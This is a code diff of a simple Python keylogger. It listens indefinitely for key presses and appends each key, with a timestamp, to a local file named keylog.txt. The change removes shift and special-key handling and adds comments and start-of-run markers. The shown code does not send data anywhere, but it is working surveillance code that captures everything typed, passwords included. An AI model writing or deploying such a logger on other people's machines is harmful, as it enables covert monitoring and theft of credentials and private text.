@@ -17,30 +17,16 @@ logo = (
 )
 
 
+# Logs list of keys to a text file
 def log(list_of_keys):
-    global shift
     with (open('keylog.txt', 'a') as keylog):
-        result = ''
         for key in list_of_keys:
-            if key == keyboard.Key.space:
-                result = ' '
-            elif key == keyboard.Key.enter:
-                result = '\n'
-            elif key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
-                shift = True
-            elif 'Key' in str(key):
-                result = "~" + str(key).upper() + "~"
-            else:
-                result = str(key).replace("'", '')
-
-            if shift:
-                result = result.upper()
-                shift = False
-
-            keylog.write(result)
-            list_of_keys.clear()
+            result = str(key).replace("'", '')      # Remove surrounding quotes
+            keylog.write(datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + result + "\n")   # Log with time
+            list_of_keys.clear()    # Empty the list
 
 
+# Registers a key press event
 def key_pressed(key):
     try:
         key_list.append(key)    # Save key to list of keys
@@ -49,15 +35,17 @@ def key_pressed(key):
         pass
 
 
+# Main Program
 try:
-    if not os.path.isfile('keylog.txt'):
+    if not os.path.isfile('keylog.txt'):    # On the first run, include the logo
         with (open('keylog.txt', 'w') as new_file):
             new_file.write(logo)
-            new_file.write("NEW RUN " + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\n'))
+            new_file.write(datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + "KEELOG WAS STARTED" + "\n")
     else:
         with (open('keylog.txt', 'a') as existing_file):
-            existing_file.write("\n\nNEW RUN " + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\n'))
+            existing_file.write("\n\n" + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + "KEELOG WAS STARTED" + "\n")
 
+    # Listed for keyboard inputs indefinitely
     with keyboard.Listener(on_press=key_pressed) as listener:
         listener.join()
 except KeyboardInterrupt:
